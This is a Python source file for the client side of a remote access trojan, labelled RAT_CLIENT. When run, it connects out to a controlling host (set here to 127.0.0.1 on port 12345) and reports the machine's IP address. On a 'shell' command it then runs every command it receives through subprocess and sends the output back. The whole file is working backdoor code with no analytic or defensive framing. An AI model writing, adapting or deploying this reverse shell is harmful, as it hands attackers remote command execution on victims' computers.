import socket, os
import subprocess
class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())

    def execute(self):

        while True:

            command = s.recv(1024).decode()

            if command == 'shell':
                    while 1:
                        command = s.recv(1024).decode()
                        if command.lower() == 'exit':
                            break
                        if command.startswith("cd"):
                            if command.strip('\n') == 'cd':
                                s.send(os.getcwd().encode())
                                continue
                            os.chdir(command[3:].replace('\n', ''))
                            s.send(os.getcwd().encode())

                            continue
                        output = subprocess.getoutput(command)
                        s.send(output.encode())








rat_client = RAT_CLIENT("127.0.0.1", 12345)

rat_client.build_connection()

rat_client.execute()